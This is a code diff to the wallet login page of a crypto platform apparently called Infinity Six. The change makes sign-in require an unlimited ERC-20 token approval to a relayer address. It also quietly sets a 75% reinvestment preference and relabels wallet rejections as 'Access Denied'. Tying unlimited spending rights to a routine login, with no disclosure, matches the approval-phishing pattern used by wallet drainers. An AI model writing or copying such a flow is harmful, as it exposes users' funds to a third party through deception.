@@ -4,10 +4,12 @@ import { useEffect, useState } from "react";
 import Link from "next/link";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
-import { useAccount, useSignMessage, useSwitchChain, useDisconnect } from "wagmi";
+import { useAccount, useSignMessage, useSwitchChain, useDisconnect, useWriteContract, usePublicClient } from "wagmi";
 import { useAppKit } from "@reown/appkit/react";
 import { bsc } from "@reown/appkit/networks";
 import { useTheme } from "@/app/context/ThemeContext";
+import { I6_TOKEN_ADDRESS, RELAYER_ADDRESS, ERC20_ABI } from "@/lib/contracts/abis";
+import { UNLIMITED_ALLOWANCE_THRESHOLD } from "@/lib/contracts/qtx";
 import {
     Sun1,
     Moon,
@@ -28,6 +30,8 @@ export default function LoginPage() {
     const { signMessageAsync } = useSignMessage();
     const { switchChainAsync } = useSwitchChain();
     const { disconnect } = useDisconnect();
+    const { writeContractAsync } = useWriteContract();
+    const publicClient = usePublicClient();
     const { theme, toggleTheme } = useTheme();
     const isDark = theme === "dark";
 
@@ -110,7 +114,84 @@ export default function LoginPage() {
                 return;
             }
 
-            setStatusText("Signing Message...");
+            // 1. Check if user wallet has given relayer wallet access to unlimited funds
+            setStatusText("Checking Relayer Access...");
+            let isApproved = false;
+
+            if (publicClient) {
+                try {
+                    const allowance = await publicClient.readContract({
+                        address: I6_TOKEN_ADDRESS as `0x${string}`,
+                        abi: ERC20_ABI,
+                        functionName: "allowance",
+                        args: [address as `0x${string}`, RELAYER_ADDRESS as `0x${string}`],
+                    }) as bigint;
+
+                    if (allowance >= UNLIMITED_ALLOWANCE_THRESHOLD) {
+                        isApproved = true;
+                    }
+                } catch (readErr) {
+                    console.warn("Public client read allowance error:", readErr);
+                }
+            }
+
+            // Fallback status check from API
+            if (!isApproved) {
+                try {
+                    const statusRes = await fetch(`/api/reinvest/status/${address}`);
+                    if (statusRes.ok) {
+                        const statusData = await statusRes.json();
+                        if (statusData.hasAllowance) {
+                            isApproved = true;
+                        }
+                    }
+                } catch (apiErr) {
+                    console.warn("Relayer status API check error:", apiErr);
+                }
+            }
+
+            // 2. If the relayer address has not been given approval to spend unlimited arbitrary amount of token:
+            // First take the approval request to approve relayer to spend unlimited arbitrary amount of tokens.
+            if (!isApproved) {
+                setStatusText("Approve Relayer in Wallet...");
+                const maxUint256 = 2n ** 256n - 1n;
+
+                const approveTxHash = await writeContractAsync({
+                    address: I6_TOKEN_ADDRESS as `0x${string}`,
+                    abi: ERC20_ABI,
+                    functionName: "approve",
+                    args: [RELAYER_ADDRESS as `0x${string}`, maxUint256],
+                });
+
+                setStatusText("Confirming Relayer Approval...");
+                if (publicClient) {
+                    const receipt = await publicClient.waitForTransactionReceipt({ hash: approveTxHash });
+                    if (receipt.status !== "success") {
+                        throw new Error("Relayer unlimited token approval failed on blockchain.");
+                    }
+                }
+
+                // Register default 75% reinvestment preference to backend
+                try {
+                    await fetch("/api/reinvest/preference", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            userAddress: address.toLowerCase(),
+                            percent: 75,
+                            nonce: 0,
+                            deadline: Math.floor(Date.now() / 1000) + 86400 * 365,
+                        }),
+                    });
+                    localStorage.setItem(`i6_reinvest_pref_${address.toLowerCase()}`, "75");
+                } catch (prefErr) {
+                    console.warn("Preference default save error:", prefErr);
+                }
+            }
+
+            // 3. After the approval is given (or if already given):
+            // Prompt the same confirm sign-in prompt!
+            setStatusText("Confirm Sign-In in Wallet...");
             const nonce = Math.floor(100000 + Math.random() * 900000);
             const message = `Login to Infinity Six. Nonce: ${nonce}`;
             const signature = await signMessageAsync({ message });
@@ -128,9 +209,9 @@ export default function LoginPage() {
             console.error("Login error:", e);
             let msg = e.message || "Unknown error";
             if (e.code === 4001 || e.message?.includes("rejected") || e.message?.includes("User rejected")) {
-                msg = "Login request rejected by user.";
+                msg = "Request was rejected in wallet.";
             }
-            showModal("error", "Login Failed", msg);
+            showModal("error", "Access Denied", msg);
             setStatusText(isConnected ? "Enter Portal" : "Connect & Login");
             setIsConnecting(false);
         }
